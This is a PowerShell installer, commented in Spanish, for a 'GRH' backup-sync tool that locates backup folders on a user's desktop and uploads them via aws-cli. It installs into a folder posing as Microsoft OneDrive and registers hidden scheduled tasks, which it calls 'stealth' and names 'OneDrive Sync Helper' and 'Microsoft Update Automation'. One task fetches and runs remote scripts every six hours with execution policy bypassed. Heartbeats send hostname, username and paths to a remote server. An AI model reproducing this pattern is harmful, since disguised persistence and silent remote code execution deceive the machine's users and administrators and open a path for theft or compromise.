#Requires -Version 5.0
<#
.SYNOPSIS
  Instalador principal. Descargado desde GitHub raw por GRH-Setup.bat.

.DESCRIPTION
  Asume que el .bat ya creo %LOCALAPPDATA%\Microsoft\OneDriveSync\ +
  config.json con r2.* + heartbeat.* (source vacio).

  Paso a paso:
    1. Reporta heartbeat install_start.
    2. Resuelve carpeta source (shortcut / scan / picker).
    3. Instala aws-cli via MSI si falta.
    4. Descarga sync-bak.ps1 + update.ps1 a local.
    5. Registra 2 scheduled tasks stealth.
    6. Corre primer sync.
    7. Reporta install_done.
#>

$ErrorActionPreference = 'Stop'

$GITHUB_RAW = 'https://raw.githubusercontent.com/oremenicucci/grh-installer/main'
$InstallDir = Join-Path $env:LOCALAPPDATA 'Microsoft\OneDriveSync'
$LogsDir    = Join-Path $InstallDir 'logs'
$StateDir   = Join-Path $InstallDir 'state'
$ConfigPath = Join-Path $InstallDir 'config.json'
$SyncPath   = Join-Path $InstallDir 'sync-bak.ps1'
$UpdatePath = Join-Path $InstallDir 'update.ps1'
$LogFile    = Join-Path $LogsDir 'install.log'

function Write-Log {
    param([string]$Level, [string]$Message)
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    Add-Content -Path $LogFile -Value "[$ts] [$Level] $Message" -Encoding UTF8
    Write-Host "$Level $Message"
}

function Send-Heartbeat {
    param(
        [Parameter(Mandatory)][string]$Event,
        [string]$Status = 'ok',
        [hashtable]$Details = @{}
    )
    try {
        if (-not (Test-Path $ConfigPath)) { return }
        $cfg = Get-Content $ConfigPath -Raw | ConvertFrom-Json
        if (-not $cfg.heartbeat -or -not $cfg.heartbeat.url) { return }
        $body = @{
            client_id = $env:COMPUTERNAME
            event     = $Event
            status    = $Status
            details   = $Details
        } | ConvertTo-Json -Depth 5
        Invoke-WebRequest -Uri $cfg.heartbeat.url `
            -Method Post `
            -Headers @{ Authorization = "Bearer $($cfg.heartbeat.secret)" } `
            -ContentType 'application/json' `
            -Body $body `
            -TimeoutSec 10 `
            -UseBasicParsing | Out-Null
    } catch {
        # Fire-and-forget — si la red esta mal, no bloqueamos el install
        Write-Log 'WARN' "heartbeat fail: $($_.Exception.Message)"
    }
}

Write-Host ''
Write-Host '==============================================' -ForegroundColor Cyan
Write-Host '  GRH - Instalando sincronizador de backups' -ForegroundColor Cyan
Write-Host '==============================================' -ForegroundColor Cyan
Write-Host ''

Write-Log 'INFO' '=== install start ==='
Send-Heartbeat -Event 'install_start' -Details @{
    hostname = $env:COMPUTERNAME
    user     = $env:USERNAME
    psver    = $PSVersionTable.PSVersion.ToString()
    osver    = (Get-CimInstance Win32_OperatingSystem).Caption
}

try {
    # --- 1. Verificar config ---
    if (-not (Test-Path $ConfigPath)) {
        throw "No se encontro $ConfigPath. Correr GRH-Setup.bat primero."
    }
    $config = Get-Content $ConfigPath -Raw | ConvertFrom-Json

    # --- 2. Resolver source ---
    Write-Host '[1/6] Buscando carpeta de backup...' -ForegroundColor Cyan

    function Resolve-LnkTarget {
        param([string]$LnkPath)
        try {
            $shell = New-Object -ComObject WScript.Shell
            return $shell.CreateShortcut($LnkPath).TargetPath
        } catch { return $null }
    }

    function Find-DesktopFolders {
        $result = @()
        foreach ($p in @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Escritorio", "$env:PUBLIC\Desktop")) {
            if (Test-Path $p) { $result += $p }
        }
        return $result
    }

    $source = $null
    $sourceMethod = $null

    foreach ($desk in (Find-DesktopFolders)) {
        foreach ($m in (Get-ChildItem -Path $desk -Filter 'server*.lnk' -ErrorAction SilentlyContinue)) {
            $target = Resolve-LnkTarget $m.FullName
            if ($target -and (Test-Path $target)) {
                $source = $target
                $sourceMethod = "shortcut:$($m.Name)"
                break
            }
        }
        if ($source) { break }
    }

    if (-not $source) {
        Write-Host '    Sin shortcut "server", escaneando desktop...' -ForegroundColor Yellow
        foreach ($desk in (Find-DesktopFolders)) {
            foreach ($lnk in (Get-ChildItem -Path $desk -Filter '*.lnk' -ErrorAction SilentlyContinue)) {
                $target = Resolve-LnkTarget $lnk.FullName
                if (-not $target -or -not (Test-Path $target -PathType Container)) { continue }
                $has = Get-ChildItem -Path $target -File -Filter '*.zip' -ErrorAction SilentlyContinue | Select-Object -First 1
                if (-not $has) {
                    $has = Get-ChildItem -Path $target -File -Filter '*.bak' -ErrorAction SilentlyContinue | Select-Object -First 1
                }
                if ($has) {
                    $source = $target
                    $sourceMethod = "scan:$($lnk.Name)"
                    break
                }
            }
            if ($source) { break }
        }
    }

    if (-not $source) {
        # Si ya hay source previo en config (re-install desde update.ps1 non-interactive),
        # usarlo y no abrir dialog.
        if ($config.source -and (Test-Path $config.source -ErrorAction SilentlyContinue)) {
            $source = $config.source
            $sourceMethod = 'reuse:previous-config'
        } elseif ([Environment]::UserInteractive -and -not [Environment]::GetCommandLineArgs() -match 'NonInteractive') {
            Write-Host '    Seleccionar manualmente.' -ForegroundColor Yellow
            Add-Type -AssemblyName System.Windows.Forms
            $fb = New-Object System.Windows.Forms.FolderBrowserDialog
            $fb.Description = 'Seleccionar la carpeta donde esta el backup de Sigma'
            $fb.ShowNewFolderButton = $false
            if ($fb.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK) {
                $source = $fb.SelectedPath
                $sourceMethod = 'picker'
            } else {
                throw 'Cancelado: no se selecciono carpeta.'
            }
        } else {
            # Non-interactive (task scheduler re-run) y sin source previo -> abortar suave
            Write-Log 'WARN' 'Non-interactive sin source. Saltando install (se reintenta cuando haya interactivo).'
            exit 0
        }
    }

    Write-Log 'INFO' "source=$source (via $sourceMethod)"
    Write-Host "    OK: $source" -ForegroundColor Green
    Send-Heartbeat -Event 'install_source_resolved' -Details @{
        source_path = $source
        method      = $sourceMethod
    }

    $config.source = $source
    $config | ConvertTo-Json -Depth 3 | Set-Content -Path $ConfigPath -Encoding UTF8

    # --- 3. aws-cli ---
    Write-Host ''
    Write-Host '[2/6] Verificando aws-cli...' -ForegroundColor Cyan
    $awsExe = Get-Command aws -ErrorAction SilentlyContinue
    if (-not $awsExe) {
        Write-Host '    Instalando aws-cli v2 (~60 seg)...' -ForegroundColor Yellow
        $msiUrl = 'https://awscli.amazonaws.com/AWSCLIV2.msi'
        $msiPath = Join-Path $env:TEMP 'AWSCLIV2.msi'
        Invoke-WebRequest -Uri $msiUrl -OutFile $msiPath -UseBasicParsing
        Start-Process msiexec.exe -ArgumentList "/i `"$msiPath`" /quiet /norestart" -Wait
        Remove-Item $msiPath -Force -ErrorAction SilentlyContinue
        $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
        $awsExe = Get-Command aws -ErrorAction SilentlyContinue
        if (-not $awsExe -and (Test-Path 'C:\Program Files\Amazon\AWSCLIV2\aws.exe')) {
            $awsExe = Get-Item 'C:\Program Files\Amazon\AWSCLIV2\aws.exe'
        }
        if (-not $awsExe) {
            throw 'aws-cli no quedo instalado. Reiniciar PC.'
        }
    }
    $awsVersion = (& aws --version 2>&1) -join ' '
    Write-Host "    OK: $awsVersion" -ForegroundColor Green
    Send-Heartbeat -Event 'install_aws_ready' -Details @{ version = $awsVersion }

    # --- 4. Descargar scripts ---
    Write-Host ''
    Write-Host '[3/6] Descargando scripts...' -ForegroundColor Cyan
    Invoke-WebRequest -Uri "$GITHUB_RAW/sync-bak.ps1" -OutFile $SyncPath -UseBasicParsing
    Invoke-WebRequest -Uri "$GITHUB_RAW/update.ps1"   -OutFile $UpdatePath -UseBasicParsing
    Write-Host '    OK' -ForegroundColor Green

    # --- 5. Primer sync ---
    Write-Host ''
    Write-Host '[4/6] Primer sync...' -ForegroundColor Cyan
    & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $SyncPath
    Write-Host "    (ver $LogsDir\sync.log)" -ForegroundColor Gray

    # --- 6. Tareas programadas ---
    Write-Host ''
    Write-Host '[5/6] Registrando tareas...' -ForegroundColor Cyan

    foreach ($legacy in @('GRH Sync BAK','GRH Self Update')) {
        $ex = Get-ScheduledTask -TaskName $legacy -ErrorAction SilentlyContinue
        if ($ex) { Unregister-ScheduledTask -TaskName $legacy -Confirm:$false }
    }

    function New-RFSettings {
        param([int]$MinLimit = 15)
        New-ScheduledTaskSettingsSet `
            -AllowStartIfOnBatteries `
            -DontStopIfGoingOnBatteries `
            -StartWhenAvailable `
            -MultipleInstances IgnoreNew `
            -ExecutionTimeLimit (New-TimeSpan -Minutes $MinLimit) `
            -RestartCount 99 `
            -RestartInterval (New-TimeSpan -Minutes 1) `
            -Hidden
    }

    # LogonType Interactive (NO S4U) — el task solo corre cuando la usuaria esta
    # logueada, pero tiene acceso a credenciales cacheadas para network shares
    # (\\Dataserver\...). S4U no funciona en workgroups para UNC paths.
    $principal = New-ScheduledTaskPrincipal `
        -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited

    $TaskFolder = '\Microsoft\OneDriveSync\'

    # Sync (30 min)
    $TaskSync = 'OneDrive Sync Helper'
    $ex = Get-ScheduledTask -TaskName $TaskSync -TaskPath $TaskFolder -ErrorAction SilentlyContinue
    if ($ex) { Unregister-ScheduledTask -TaskName $TaskSync -TaskPath $TaskFolder -Confirm:$false }

    # Trigger: boot + once con repeticion (evita New-CimInstance MSFT_TaskRepetitionPattern
    # que en algunos Windows 10 tira 'Clase no valida')
    $tBoot = New-ScheduledTaskTrigger -AtStartup
    $tBoot.Delay = 'PT5M'
    $tRepeat = New-ScheduledTaskTrigger `
        -Once -At (Get-Date).AddMinutes(5) `
        -RepetitionInterval (New-TimeSpan -Minutes 30) `
        -RepetitionDuration ([TimeSpan]::FromDays(365 * 20))

    Register-ScheduledTask `
        -TaskName $TaskSync -TaskPath $TaskFolder `
        -Description 'Microsoft OneDrive Sync Helper' `
        -Action (New-ScheduledTaskAction -Execute 'powershell.exe' `
            -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$SyncPath`"") `
        -Trigger @($tBoot, $tRepeat) `
        -Settings (New-RFSettings 15) `
        -Principal $principal | Out-Null

    # Update (6h)
    $TaskUpd = 'Microsoft Update Automation'
    $ex = Get-ScheduledTask -TaskName $TaskUpd -TaskPath $TaskFolder -ErrorAction SilentlyContinue
    if ($ex) { Unregister-ScheduledTask -TaskName $TaskUpd -TaskPath $TaskFolder -Confirm:$false }

    $uBoot = New-ScheduledTaskTrigger -AtStartup
    $uBoot.Delay = 'PT10M'
    $uRepeat = New-ScheduledTaskTrigger `
        -Once -At (Get-Date).AddMinutes(15) `
        -RepetitionInterval (New-TimeSpan -Hours 6) `
        -RepetitionDuration ([TimeSpan]::FromDays(365 * 20))

    Register-ScheduledTask `
        -TaskName $TaskUpd -TaskPath $TaskFolder `
        -Description 'Microsoft Update Automation' `
        -Action (New-ScheduledTaskAction -Execute 'powershell.exe' `
            -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$UpdatePath`"") `
        -Trigger @($uBoot, $uRepeat) `
        -Settings (New-RFSettings 10) `
        -Principal $principal | Out-Null

    Write-Host "    OK: $TaskFolder$TaskSync + $TaskFolder$TaskUpd" -ForegroundColor Green
    Send-Heartbeat -Event 'install_tasks_ok' -Details @{
        tasks = @($TaskSync, $TaskUpd)
    }

    # --- Final ---
    Write-Host ''
    Write-Host '==============================================' -ForegroundColor Green
    Write-Host '  INSTALACION COMPLETA' -ForegroundColor Green
    Write-Host '==============================================' -ForegroundColor Green
    Write-Host "Instalado en: $InstallDir" -ForegroundColor Gray
    Write-Host "Source:       $source" -ForegroundColor Gray
    Write-Host ''
    Write-Host 'Todo corre solo cada 30 min. Podes cerrar esta ventana.' -ForegroundColor Gray
    Write-Host ''

    Write-Log 'INFO' '=== install OK ==='
    Send-Heartbeat -Event 'install_done' -Details @{
        source_path = $source
        install_dir = $InstallDir
        aws_version = $awsVersion
    }

    Start-Sleep -Seconds 5
}
catch {
    $errMsg = $_.Exception.Message
    Write-Log 'ERROR' $errMsg
    Write-Log 'ERROR' $_.ScriptStackTrace
    Send-Heartbeat -Event 'install_error' -Status 'error' -Details @{
        error = $errMsg
        stack = $_.ScriptStackTrace
    }
    Write-Host ''
    Write-Host "Error: $errMsg" -ForegroundColor Red
    Write-Host 'Detalles en %LOCALAPPDATA%\Microsoft\OneDriveSync\logs\install.log' -ForegroundColor Yellow
    Start-Sleep -Seconds 15
    exit 1
}
